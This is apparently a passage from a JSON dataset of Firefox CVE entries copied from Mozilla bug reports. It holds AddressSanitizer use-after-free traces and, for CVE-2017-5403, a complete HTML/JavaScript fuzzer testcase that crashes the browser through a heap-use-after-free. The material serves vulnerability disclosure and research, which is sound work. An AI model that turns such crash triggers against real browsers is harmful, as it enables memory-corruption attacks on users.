mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1716:17 #19 0x7f6ce7e64244 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1589:5 #20 0x7f6ce7e6488e in mozilla::ipc::MessageChannel::MessageTask::Run() /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1622:5 #21 0x7f6ce706695b in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1261:7 #22 0x7f6ce70632b0 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:394:10 #23 0x7f6ce7e6d5df in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #24 0x7f6ce7ddf868 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:3 #25 0x7f6ce7ddf868 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #26 0x7f6ce7ddf868 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #27 0x7f6ced23481f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:3 #28 0x7f6cef42e4d7 in XRE_RunAppShell() /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:927:12 #29 0x7f6ce7ddf868 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:3 #30 0x7f6ce7ddf868 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #31 0x7f6ce7ddf868 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #32 0x7f6cef42dcfd in XRE_InitChildProcess(int, char**, XREChildData const*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:759:7 #33 0x4df933 in content_process_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:115:19 #34 0x4df933 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:284 #35 0x7f6d0243482f in __libc_start_main /build/glibc-t3gR2i/glibc-2.23/csu/../csu/libc-start.c:291 #36 0x41ba58 in _start (/home/nils/fuzzer3/firefox/firefox+0x41ba58) 0x60d00004a2a8 is located 40 bytes inside of 144-byte region [0x60d00004a280,0x60d00004a310) freed by thread T0 (Web Content) here: #0 0x4b21ab in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:38:3 #1 0x7f6ce6f0e744 in SnowWhiteKiller::~SnowWhiteKiller() /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2664:9 #2 0x7f6ce6f0e336 in nsCycleCollector::FreeSnowWhite(bool) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2839:3 #3 0x7f6ce6f15506 in nsCycleCollector::BeginCollection(ccType, nsICycleCollectorListener*) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3825:3 #4 0x7f6ce6f14cdc in nsCycleCollector::Collect(ccType, js::SliceBudget&, nsICycleCollectorListener*, bool) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3650:9 #5 0x7f6ce6f17d56 in nsCycleCollector_collect(nsICycleCollectorListener*) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:4143:3 #6 0x7f6ce9b32229 in nsJSContext::CycleCollectNow(nsICycleCollectorListener*, int) /home/worker/workspace/build/src/dom/base/nsJSEnvironment.cpp:1438:3 #7 0x7f6ce968882d in nsDOMWindowUtils::CycleCollect(nsICycleCollectorListener*, int) /home/worker/workspace/build/src/dom/base/nsDOMWindowUtils.cpp:1339:3 #8 0x7f6ce7080be1 in NS_InvokeByIndex /home/worker/workspace/build/src/xpcom/reflect/xptcall/md/unix/xptcinvoke_asm_x86_64_unix.S:115 #9 0x7f6ce8849b3e in Invoke /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:2010:12 #10 0x7f6ce8849b3e in Call /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1329 #11 0x7f6ce8849b3e in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1296 #12 0x7f6ce885166b in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:983:12 #13 0x7f6cf0eb731c in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #14 0x7f6cf0eb731c in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:460 #15 0x7f6cf0e9d0ae in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:511:12 #16 0x7f6cf0e9d0ae in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2957 #17 0x7f6cf0e80fa1 in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:406:12 #18 0x7f6cf0eb759c in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:478:15 #19 0x7f6cf0eb7c52 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:524:10 #20 0x7f6cf16ef4f2 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2788:12 #21 0x7f6ce878521f in xpc::FunctionForwarder(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/ExportHelpers.cpp:319:18 #22 0x7f6cf0eb731c in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #23 0x7f6cf0eb731c in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:460 #24 0x7f6cf0e9d0ae in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:511:12 #25 0x7f6cf0e9d0ae in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2957 #26 0x7f6cf0e80fa1 in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:406:12 #27 0x7f6cf0eb759c in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:478:15 #28 0x7f6cf0eb7c52 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:524:10 #29 0x7f6cf16f175d in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2847:12 #30 0x7f6ceafc986f in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:259:37 #31 0x7f6ceb8eecf7 in Call<nsISupports *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:361:12 #32 0x7f6ceb8eecf7 in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /home/worker/workspace/build/src/dom/events/JSEventHandler.cpp:214 #33 0x7f6ceb8b8e6d in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1136:16 #34 0x7f6ceb8ba9ec in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1318:20 #35 0x7f6ceb8a5433 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:465:5 #36 0x7f6ceb8a8d24 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:822:9 previously allocated by thread T0 (Web Content) here: #0 0x4b24cb in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:52:3 #1 0x4e09ad in moz_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17 #2 0x7f6ced5c9046 in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:194:12 #3 0x7f6ced5c9046 in mozilla::dom::FontFace::CreateForRule(nsISupports*, mozilla::dom::FontFaceSet*, nsCSSFontFaceRule*) /home/worker/workspace/build/src/layout/style/FontFace.cpp:150 #4 0x7f6ced5db9b4 in mozilla::dom::FontFaceSet::UpdateRules(nsTArray<nsFontFaceRuleContainer> const&) /home/worker/workspace/build/src/layout/style/FontFaceSet.cpp:718:11 #5 0x7f6ce9a72d47 in nsIDocument::FlushUserFontSet() /home/worker/workspace/build/src/dom/base/nsDocument.cpp:12853:19 #6 0x7f6ce9a732cf in GetUserFontSet /home/worker/workspace/build/src/dom/base/nsDocument.cpp:12811:5 #7 0x7f6ce9a732cf in nsIDocument::Fonts() /home/worker/workspace/build/src/dom/base/nsDocument.cpp:12909 #8 0x7f6ceaf4e288 in mozilla::dom::DocumentBinding::get_fonts(JSContext*, JS::Handle<JSObject*>, nsIDocument*, JSJitGetterCallArgs) /home/worker/workspace/build/src/obj-firefox/dom/bindings/DocumentBinding.cpp:5336:57 #9 0x7f6ceb46a72d in mozilla::dom::GenericBindingGetter(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2849:13 #10 0x7f6cf0eb731c in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #11 0x7f6cf0eb731c in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:460 #12 0x7f6cf0eb88fe in InternalCall /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:505:12 #13 0x7f6cf0eb88fe in Call /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:524 #14 0x7f6cf0eb88fe in js::CallGetter(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:638 #15 0x7f6cf1c5d907 in CallGetter /home/worker/workspace/build/src/js/src/vm/NativeObject.cpp:1812:16 #16 0x7f6cf1c5d907 in GetExistingProperty<js::AllowGC::CanGC> /home/worker/workspace/build/src/js/src/vm/NativeObject.cpp:1860 #17 0x7f6cf1c5d907 in NativeGetPropertyInline<js::AllowGC::CanGC> /home/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2089 #18 0x7f6cf1c5d907 in js::NativeGetProperty(JSContext*, JS::Handle<js::NativeObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2123 #19 0x7f6cf16eb71c in GetProperty /home/worker/workspace/build/src/js/src/vm/NativeObject.h:1497:12 #20 0x7f6cf16eb71c in JS_ForwardGetPropertyTo(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::Handle<JS::Value>, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2534 #21 0x7f6ceb46244f in mozilla::dom::GetPropertyOnPrototype(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, bool*, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2036:10 #22 0x7f6ceb178cdc in mozilla::dom::HTMLDocumentBinding::DOMProxyHandler::get(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) const /home/worker/workspace/build/src/obj-firefox/dom/bindings/HTMLDocumentBinding.cpp:2111:8 #23 0x7f6cf199460e in js::Proxy::get(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:311:12 #24 0x7f6cf0ec00ca in GetProperty /home/worker/workspace/build/src/js/src/vm/NativeObject.h:1496:16 #25 0x7f6cf0ec00ca in GetProperty /home/worker/workspace/build/src/js/src/jsobj.h:844 #26 0x7f6cf0ec00ca in js::GetProperty(JSContext*, JS::Handle<JS::Value>, JS::Handle<js::PropertyName*>, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:4311 #27 0x7f6cf0ea05d4 in GetPropertyOperation /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:192:12 #28 0x7f6cf0ea05d4 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2674 #29 0x7f6cf0e80fa1 in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:406:12 #30 0x7f6cf0eb759c in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:478:15 #31 0x7f6cf0eb7c52 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:524:10 #32 0x7f6cf16f175d in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2847:12 #33 0x7f6ceafc986f in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:259:37 #34 0x7f6ceb8eecf7 in Call<nsISupports *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:361:12 #35 0x7f6ceb8eecf7 in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /home/worker/workspace/build/src/dom/events/JSEventHandler.cpp:214 #36 0x7f6ceb8b8e6d in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1136:16 #37 0x7f6ceb8ba9ec in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1318:20 #38 0x7f6ceb8a5433 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:465:5 #39 0x7f6ceb8a8d24 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:822:9 #40 0x7f6ceda6ace9 in nsDocumentViewer::LoadComplete(nsresult) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1044:7 #41 0x7f6cee91c41e in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7628:5 #42 0x7f6cee918354 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7432:7 SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/obj-firefox/dist/include/nsISupportsImpl.h:58:36 in GetThread Shadow bytes around the buggy address: 0x0c1a80001400: fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c1a80001410: fd fd fd fd fa fa fa fa fa fa fa fa fd fd fd fd 0x0c1a80001420: fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa 0x0c1a80001430: fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 0x0c1a80001440: 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa =>0x0c1a80001450: fd fd fd fd fd[fd]fd fd fd fd fd fd fd fd fd fd 0x0c1a80001460: fd fd fa fa fa fa fa fa fa fa 00 00 00 00 00 00 0x0c1a80001470: 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa 0x0c1a80001480: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd 0x0c1a80001490: fd fd fd fd fd fd fa fa fa fa fa fa fa fa 00 00 0x0c1a800014a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==25681==ABORTING"
      }
    ],
    "CVE-2017-5403": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1340186",
        "title": "heap-use-after-free in nsFrameManagerBase::UndisplayedMap::RemoveNodeFor",
        "description": "The following testcase crashes the latest asan build of Firefox. <script> function start() { o0=document.createElementNS('http://www.w3.org/1999/xhtml','iframe'); o0.src='data:text/html,<html><body><table><tr><td id=fo>xxx</td></tr></table></body></html>'; o0.addEventListener('load', fun1,false); document.body.appendChild(o0); o1=window.document; } var called=0; function fun1() { if(called++)return; o4=o0.contentDocument; o38=o4.getElementById('fo'); o107=document.getSelection(); o4.designMode='on'; o213=new Blob([document.documentElement], {'type': 'text/html'}); o0.src=window.URL.createObjectURL(o213); o1.designMode='on'; o379=document.createElementNS('http://www.w3.org/1999/xhtml','textarea'); o0.appendChild(o379); o462=document.createRange(); o462.selectNode(o38); o107.addRange(o462); try{o1.execCommand('insertunorderedlist',false,null);}catch(e){} window.setTimeout(fun2, 4); } function fun2() { window.fuzzPriv.CC();window.fuzzPriv.GC();window.fuzzPriv.CC(); window.setTimeout(\"location.reload()\",500); } </script> <body onload=\"start()\"></body> ================================================================= ==24376==ERROR: AddressSanitizer: heap-use-after-free on address 0x6250003dd140 at pc 0x7fd00d89be4f bp 0x7ffc760e1470 sp 0x7ffc760e1468 READ of size 8 at 0x6250003dd140 thread T0 (Web Content) #0 0x7fd00d89be4e in RemoveChild /home/worker/workspace/build/src/layout/style/nsStyleContext.cpp:343:10 #1 0x7fd00d89be4e in nsStyleContext::~nsStyleContext() /home/worker/workspace/build/src/layout/style/nsStyleContext.cpp:212 #2 0x7fd00d8a6610 in nsStyleContext::Destroy() /home/worker/workspace/build/src/layout/style/nsStyleContext.cpp:1350:3 #3 0x7fd00dabf6c3 in Release /home/worker/workspace/build/src/layout/style/nsStyleContext.h:130:7 #4 0x7fd00dabf6c3 in Release /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:40 #5 0x7fd00dabf6c3 in Release /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:394 #6 0x7fd00dabf6c3 in ~RefPtr /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:78 #7 0x7fd00dabf6c3 in mozilla::UndisplayedNode::~UndisplayedNode() /home/worker/workspace/build/src/layout/base/nsFrameManager.h:57 #8 0x7fd00dabeb08 in nsFrameManagerBase::UndisplayedMap::RemoveNodeFor(nsIContent*, mozilla::UndisplayedNode*) /home/worker/workspace/build/src/layout/base/nsFrameManager.cpp:794:3 #9 0x7fd00da77a25 in nsCSSFrameConstructor::ContentRemoved(nsIContent*, nsIContent*, nsIContent*, nsCSSFrameConstructor::RemoveFlags, bool*, nsIContent**) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:8320:5 #10 0x7fd00d9d1f22 in mozilla::PresShell::ContentRemoved(nsIDocument*, nsIContent*, nsIContent*, int, nsIContent*) /home/worker/workspace/build/src/layout/base/PresShell.cpp:4519:3 #11 0x7fd00d4044ed in mozilla::HTMLEditor::DeleteRefToAnonymousNode(nsIContent*, nsIContent*, nsIPresShell*) /home/worker/workspace/build/src/editor/libeditor/HTMLAnonymousNodeEditor.cpp:298:7 #12 0x7fd00d4078cf in RemoveListenerAndDeleteRef /home/worker/workspace/build/src/editor/libeditor/HTMLAnonymousNodeEditor.cpp:263:3 #13 0x7fd00d4078cf in mozilla::HTMLEditor::HideResizers() /home/worker/workspace/build/src/editor/libeditor/HTMLEditorObjectResizer.cpp:429 #14 0x7fd00d4967df in HideAnonymousEditingUIs /home/worker/workspace/build/src/editor/libeditor/HTMLEditor.cpp:187:5 #15 0x7fd00d4967df in mozilla::HTMLEditor::PreDestroy(bool) /home/worker/workspace/build/src/editor/libeditor/HTMLEditor.cpp:341 #16 0x7fd00ff98cb9 in TearDownEditor /home/worker/workspace/build/src/docshell/base/nsDocShellEditorData.cpp:35:5 #17 0x7fd00ff98cb9 in nsDocShellEditorData::~nsDocShellEditorData() /home/worker/workspace/build/src/docshell/base/nsDocShellEditorData.cpp:28 #18 0x7fd00ffc8b0e in assign /home/worker/workspace/build/src/obj-firefox/dist/include/nsAutoPtr.h:45:5 #19 0x7fd00ffc8b0e in operator= /home/worker/workspace/build/src/obj-firefox/dist/include/nsAutoPtr.h:129 #20 0x7fd00ffc8b0e in nsSHEntryShared::DropPresentationState() /home/worker/workspace/build/src/docshell/shistory/nsSHEntryShared.cpp:173 #21 0x7fd00ffc6d66 in SyncPresentationState /home/worker/workspace/build/src/docshell/shistory/nsSHEntryShared.cpp:147:3 #22 0x7fd00ffc6d66 in nsSHEntry::SyncPresentationState() /home/worker/workspace/build/src/docshell/shistory/nsSHEntry.cpp:848 #23 0x7fd00ff5d6c3 in nsDocShell::SetupNewViewer(nsIContentViewer*) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:9413:5 #24 0x7fd00ff5c079 in nsDocShell::Embed(nsIContentViewer*, char const*, nsISupports*) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7247:17 #25 0x7fd00feeeb36 in nsDocShell::CreateContentViewer(nsACString_internal const&, nsIRequest*, nsIStreamListener**) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:9236:3 #26 0x7fd00feebb0a in nsDSURIContentListener::DoContent(nsACString_internal const&, bool, nsIRequest*, nsIStreamListener**, bool*) /home/worker/workspace/build/src/docshell/base/nsDSURIContentListener.cpp:128:10 #27 0x7fd008a9010d in nsDocumentOpenInfo::TryContentListener(nsIURIContentListener*, nsIChannel*) /home/worker/workspace/build/src/uriloader/base/nsURILoader.cpp:736:17 #28 0x7fd008a8c82e in nsDocumentOpenInfo::DispatchContent(nsIRequest*, nsISupports*) /home/worker/workspace/build/src/uriloader/base/nsURILoader.cpp:414:30 #29 0x7fd008a8b7a0 in nsDocumentOpenInfo::OnStartRequest(nsIRequest*, nsISupports*) /home/worker/workspace/build/src/uriloader/base/nsURILoader.cpp:277:8 #30 0x7fd00721525b in nsBaseChannel::OnStartRequest(nsIRequest*, nsISupports*) /home/worker/workspace/build/src/netwerk/base/nsBaseChannel.cpp:813:14 #31 0x7fd00726131e in nsInputStreamPump::OnStateStart() /home/worker/workspace/build/src/netwerk/base/nsInputStreamPump.cpp:524:14 #32 0x7fd007260853 in nsInputStreamPump::OnInputStreamReady(nsIAsyncInputStream*) /home/worker/workspace/build/src/netwerk/base/nsInputStreamPump.cpp:426:25 #33 0x7fd00705194d in nsInputStreamReadyEvent::Run() /home/worker/workspace/build/src/xpcom/io/nsStreamUtils.cpp:96:9 #34 0x7fd0070b4f59 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1264:7 #35 0x7fd0070b1850 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10 #36 0x7fd007ec6acf in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #37 0x7fd007e37c38 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:3 #38 0x7fd007e37c38 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #39 0x7fd007e37c38 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #40 0x7fd00d26f4ff in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:3 #41 0x7fd010a75997 in XRE_RunAppShell() /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:852:12 #42 0x7fd007e37c38 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:3 #43 0x7fd007e37c38 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #44 0x7fd007e37c38 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #45 0x7fd010a7547c in XRE_InitChildProcess(int, char**, XREChildData const*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:684:7 #46 0x4e00c6 in content_process_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:19 #47 0x4e00c6 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:284 #48 0x7fd02245782f in __libc_start_main /build/glibc-t3gR2i/glibc-2.23/csu/../csu/libc-start.c:291 #49 0x41c2e8 in _start (/home/nils/fuzzer3/firefox/firefox+0x41c2e8) 0x6250003dd140 is located 6208 bytes inside of 8192-byte region [0x6250003db900,0x6250003dd900) freed by thread T0 (Web Content) here: #0 0x4b2a3b in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:38:3 #1 0x7fd01fa35117 in FreeArenaList /home/worker/workspace/build/src/nsprpub/lib/ds/plarena.c:195:9 #2 0x7fd01fa35117 in PL_FinishArenaPool /home/worker/workspace/build/src/nsprpub/lib/ds/plarena.c:222 #3 0x7fd00d935eef in nsPresArena::~nsPresArena() /home/worker/workspace/build/src/layout/base/nsPresArena.cpp:56:3 #4 0x7fd00d9af120 in nsIPresShell::~nsIPresShell() /home/worker/workspace/build/src/obj-firefox/dist/include/nsIPresShell.h:181:7 #5 0x7fd00d9af2cd in mozilla::PresShell::~PresShell() /home/worker/workspace/build/src/layout/base/PresShell.cpp:898:1 #6 0x7fd00d9aacf4 in mozilla::PresShell::Release() /home/worker/workspace/build/src/layout/base/PresShell.cpp:892:1 #7 0x7fd00daac005 in assign_assuming_AddRef /home/worker/workspace/build/src/obj-firefox/dist/include/nsCOMPtr.h:334:7 #8 0x7fd00daac005 in operator= /home/worker/workspace/build/src/obj-firefox/dist/include/nsCOMPtr.h:600 #9 0x7fd00daac005 in nsDocumentViewer::DestroyPresShell() /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:4586 #10 0x7fd00da9b1bf in nsDocumentViewer::Destroy() /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1715:5 #11 0x7fd00daae0cd in nsDocumentViewer::Show() /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:2047:5 #12 0x7fd00db38eaf in nsPresContext::EnsureVisible() /home/worker/workspace/build/src/layout/base/nsPresContext.cpp:2159:27 #13 0x7fd00d9cc1da in mozilla::PresShell::UnsuppressAndInvalidate() /home/worker/workspace/build/src/layout/base/PresShell.cpp:3901:40 #14 0x7fd00daa3c8c in nsDocumentViewer::LoadComplete(nsresult) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1078:7 #15 0x7fd00ff64422 in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7628:5 #16 